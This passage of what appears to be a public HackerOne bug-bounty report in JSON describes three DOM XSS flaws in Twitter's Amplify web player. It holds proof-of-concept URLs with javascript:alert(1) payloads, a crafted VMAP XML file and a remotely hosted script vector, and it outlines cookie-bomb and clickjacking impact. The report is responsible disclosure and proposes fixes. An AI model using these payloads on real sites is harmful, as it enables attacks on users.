class=\"o\">=</span> <span class=\"nx\">u</span><span class=\"p\">.</span><span class=\"nx\">substr</span><span class=\"p\">(</span><span class=\"mi\">4</span><span class=\"p\">)),</span>\n                <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">type</span> <span class=\"o\">===</span> <span class=\"s2\">&quot;visit&quot;</span> <span class=\"p\">?</span> <span class=\"nx\">s</span> <span class=\"o\">=</span> <span class=\"nx\">r</span><span class=\"p\">(</span><span class=\"s2\">&quot;Visit %{hostname}&quot;</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n                    <span class=\"na\">hostname</span><span class=\"p\">:</span> <span class=\"nx\">u</span>\n                <span class=\"p\">})</span> <span class=\"p\">:</span> <span class=\"nx\">s</span> <span class=\"o\">=</span> <span class=\"nx\">r</span><span class=\"p\">(</span><span class=\"s2\">&quot;Watch now at %{hostname}&quot;</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n                    <span class=\"na\">hostname</span><span class=\"p\">:</span> <span class=\"nx\">u</span>\n                <span class=\"p\">});</span>\n                <span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;a target=&#39;_blank&#39;&gt;&lt;/a&gt;&quot;</span><span class=\"p\">);</span>\n                <span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;href&quot;</span><span class=\"p\">,</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">ctaLink</span><span class=\"p\">),</span>\n<span class=\"o\">--------------------------------------^^</span>\n</code></pre>\n<p>When loading a vmap file, the player will inject an anchor referencing <code>tw:cta_open_url</code>. Attacker can supply a remote vmap file with crafted <code>tw:cta_open_url</code> value (e.g. <code>javascript:</code>) to perform XSS. Such file would be like this:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>\n\n<span class=\"nt\">&lt;vmap:VMAP</span> <span class=\"na\">xmlns:tw=</span><span class=\"s\">&quot;http://twitter.com/schema/videoVMapV2.xsd&quot;</span>\n           <span class=\"na\">xmlns:vmap=</span><span class=\"s\">&quot;http://www.iab.net/vmap-1.0&quot;</span>\n           <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>\n           <span class=\"na\">xmlns:esi=</span><span class=\"s\">&quot;http://www.edge-delivery.org/esi/1.0&quot;</span>\n           <span class=\"na\">xsi:noNamespaceSchemaLocation=</span><span class=\"s\">&quot;vast3.xsd&quot;</span><span class=\"nt\">&gt;</span>\n  <span class=\"nt\">&lt;vmap:Extensions&gt;</span>\n    <span class=\"nt\">&lt;vmap:Extension&gt;</span>\n      <span class=\"nt\">&lt;tw:amplify&gt;</span>\n        <span class=\"nt\">&lt;tw:content</span> <span class=\"na\">ownerId=</span><span class=\"s\">&quot;915643998&quot;</span> <span class=\"na\">contentId=</span><span class=\"s\">&quot;fce6b1eb-b250-437f-9e68-2e9e5813a6d7&quot;</span> <span class=\"na\">stitched=</span><span class=\"s\">&quot;false&quot;</span><span class=\"nt\">&gt;</span>\n\n      <span class=\"nt\">&lt;tw:cta_open_url</span> <span class=\"na\">url=</span><span class=\"s\">&quot;javascript:alert(1)&quot;</span> <span class=\"nt\">/&gt;</span>\n\n          <span class=\"nt\">&lt;MediaFiles&gt;</span>\n            <span class=\"nt\">&lt;MediaFile&gt;</span>\n              <span class=\"cp\">&lt;![CDATA[http://amp.twimg.com/prod/multibr_v_1/video/2015/03/26/16/0f41c544-uploadedvideo-libx264-main-2028k.mp4?9gOtbn78IXQ3XYKMMntL6URZZjLVfwxgCGtkHlrJ1CY%3D]]&gt;</span>\n            <span class=\"nt\">&lt;/MediaFile&gt;</span>\n          <span class=\"nt\">&lt;/MediaFiles&gt;</span>\n        <span class=\"nt\">&lt;/tw:content&gt;</span>\n      <span class=\"nt\">&lt;/tw:amplify&gt;</span>\n    <span class=\"nt\">&lt;/vmap:Extension&gt;</span>\n  <span class=\"nt\">&lt;/vmap:Extensions&gt;</span>\n<span class=\"nt\">&lt;/vmap:VMAP&gt;</span>\n</code></pre>\n<p>I don&#39;t have PoC for this one because the vmap file needs to be hosted on a white-listed domain, but it is still a potential attack.</p>\n\n<h1 id=\"impact\">Impact</h1>\n\n<p>Now, one may wonder how these XSSes can affect users. There are at least two ways I can think of:</p>\n\n<h1 id=\"1-denial-of-service\">1. Denial of Service</h1>\n\n<p>The domain <code>*.twimg.com</code> is used to store various static files all over Twitter. Attacker can use Cookie Bomb attack to effectively make users unable to access them, hence breaking a lot of things when users browser Twitter.</p>\n\n<h1 id=\"2-clickjacking\">2. Clickjacking</h1>\n\n<p>Amplify Web Players usually appear in user&#39;s timeline. As they are embedded in iframe, attacker can use XSS to change the player&#39;s URL. Combining the flaw of <code>X-Frame-Options: SAMEORIGIN</code>, attacker can conduct a clickjacking attack with some user interactions. This is a bit tricky to explain so I guess you can watch the video demo to get some ideas.</p>\n\n<p><strong>PoC</strong>: <a title=\"http://innerht.ml/pocs/twitter-amp-xss/\" href=\"/redirect?signature=22f6db86c50afb778cff644f80bafde54e4ef366&amp;url=http%3A%2F%2Finnerht.ml%2Fpocs%2Ftwitter-amp-xss%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://innerht.ml/pocs/twitter-amp-xss/</span><i class=\"icon-external-link\"></i></a><br>\nAfter clicking the button, a new window will be opened. Wait a few seconds and click the amplify player. After that the opener page will be changed to a Tweet and the original amplify player will become an attacker controlled page which contains clickjacking attack.</p>\n\n<p><strong>Video Demo</strong>: <a title=\"https://vimeo.com/139118917\" href=\"/redirect?signature=f5106c521c8379402c2a6d7023889da4bf3535cc&amp;url=https%3A%2F%2Fvimeo.com%2F139118917\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vimeo.com/139118917</span><i class=\"icon-external-link\"></i></a> (password: xfo)</p>\n", 
    "vulnerability_information": "Hi,\r\nI would like to report multiple DOMXSS issues on https://amp.twimg.com/amplify-web-player/prod/source.html.\r\n\r\n##Details:\r\n\r\n> Please use latest IE to open all the PoCs because of CSP\r\n\r\n##1. ```$.get``` sink\r\n\r\n```javascript\r\ndefine(\"data/playlist/with_json_loader\", [\"require\", \"flight/lib/compose\", \"data/playlist/with_json_parser\"], function(e) {\r\n    function r() {\r\n        t.mixin(this, [n]),\r\n        this.loadJson = function(e) {\r\n            return $.get(e).then(this.parseJson.bind(this))\r\n-----------------------^^\r\n```\r\n\r\nIt is dangerous to use jQuery's ajax function without specifying the expected data type. Attacker can supply a remote js file to achieve XSS. This can be addressed by specifying the data type to be JSON. [Ref](https://github.com/jquery/jquery/issues/2432).\r\n\r\n**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php\r\nAfter clicking the play button, an alert will be popped up.\r\n\r\n##2. Lack of URL validation on ```playerUrl```\r\n\r\n```javascript\r\ndefine(\"ui/playback/vine_display\", [\"require\", \"flight/lib/component\"], function(e) {\r\n    function n() {\r\n        this.attributes({\r\n            playerUrl: undefined\r\n        }),\r\n        this.$frame = undefined,\r\n        this.loadVideo = function() {\r\n            if (!this.attr.playerUrl)\r\n                return;\r\n            this.$frame = $('<iframe id=\"vine-frame\" frameborder=\"0\" scrolling=\"no\" allowtransparency=\"true\"></iframe>'),\r\n            this.$frame.attr(\"src\", this.attr.playerUrl),\r\n-----------------------------------------------^^\r\n```\r\n\r\nWhen the source type is Vine, the player will try to inject an iframe with user-supplied parameter ```player_url```. Attacker can make it a ```javascript:``` attacker vector. Proper fix would be to validate if the URL starts with http(s). \r\n\r\n**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?player_url=javascript:alert(1)&source_type=vine\r\nAfter clicking the play button, an alert will be popped up.\r\n\r\n##3. Lack of URL validation on ```ctaLink```\r\n\r\n```javascript\r\n        this.updateCallToAction = function(e, t) {\r\n            var i = this.select(\"textNodeSelector\");\r\n            i.html(\"\");\r\n            if (t && t.url && t.type) {\r\n                this.id = t.id,\r\n                this.type = t.type,\r\n                this.ctaLink = t.url;\r\n                var s, o = n.getUrlMetadata(this.ctaLink), u = o.hostname;\r\n                u.indexOf(\"www.\") === 0 && (u = u.substr(4)),\r\n                t.type === \"visit\" ? s = r(\"Visit %{hostname}\", {\r\n                    hostname: u\r\n                }) : s = r(\"Watch now at %{hostname}\", {\r\n                    hostname: u\r\n                });\r\n                var a = $(\"<a target='_blank'></a>\");\r\n                a.attr(\"href\", this.ctaLink),\r\n--------------------------------------^^\r\n```\r\n\r\nWhen loading a vmap file, the player will inject an anchor referencing ```tw:cta_open_url```. Attacker can supply a remote vmap file with crafted ```tw:cta_open_url``` value (e.g. ```javascript:```) to perform XSS. Such file would be like this:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n\r\n<vmap:VMAP xmlns:tw=\"http://twitter.com/schema/videoVMapV2.xsd\"\r\n           xmlns:vmap=\"http://www.iab.net/vmap-1.0\"\r\n           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n           xmlns:esi=\"http://www.edge-delivery.org/esi/1.0\"\r\n           xsi:noNamespaceSchemaLocation=\"vast3.xsd\">\r\n  <vmap:Extensions>\r\n    <vmap:Extension>\r\n      <tw:amplify>\r\n        <tw:content ownerId=\"915643998\" contentId=\"fce6b1eb-b250-437f-9e68-2e9e5813a6d7\" stitched=\"false\">\r\n\r\n      <tw:cta_open_url url=\"javascript:alert(1)\" />\r\n\r\n          <MediaFiles>\r\n            <MediaFile>\r\n              <![CDATA[http://amp.twimg.com/prod/multibr_v_1/video/2015/03/26/16/0f41c544-uploadedvideo-libx264-main-2028k.mp4?9gOtbn78IXQ3XYKMMntL6URZZjLVfwxgCGtkHlrJ1CY%3D]]>\r\n            </MediaFile>\r\n          </MediaFiles>\r\n        </tw:content>\r\n      </tw:amplify>\r\n    </vmap:Extension>\r\n  </vmap:Extensions>\r\n</vmap:VMAP>\r\n```\r\nI don't have PoC for this one because the vmap file needs to be hosted on a white-listed domain, but it is still a potential attack.\r\n\r\n#Impact\r\nNow, one may wonder how these XSSes can affect users. There are at least two ways I can think of:\r\n\r\n#1. Denial of Service\r\nThe domain ```*.twimg.com``` is used to store various static files all over Twitter. Attacker can use Cookie Bomb attack to effectively make users unable to access them, hence breaking a lot of things when users browser Twitter.\r\n\r\n#2. Clickjacking\r\nAmplify Web Players usually appear in user's timeline. As they are embedded in iframe, attacker can use XSS to change the player's URL. Combining the flaw of ```X-Frame-Options: SAMEORIGIN```, attacker can conduct a clickjacking attack with some user interactions. This is a bit tricky to explain so I guess you can watch the video demo to get some ideas.\r\n\r\n**PoC**: http://innerht.ml/pocs/twitter-amp-xss/\r\nAfter clicking the button, a new window will be opened. Wait a few seconds and click the amplify player. After that the opener page will be changed to a Tweet and the original amplify player will become an attacker controlled page which contains clickjacking attack.\r\n\r\n**Video Demo**: https://vimeo.com/139118917 (password: xfo)\r\n\r\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://twitter.com", 
            "about": "Twitter helps you create and share ideas and information instantly, without barriers.", 
            "twitter_handle": "twittersecurity", 
            "name": "Twitter"
        }, 
        "handle": "twitter", 
        "url": "https://hackerone.com/twitter", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/061/4acfe72859c5e9cb48a152edb4e498e13fa28df2_small.?1439954730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 61, 
        "default_currency": "usd"
    }, 
    "is_published": false
}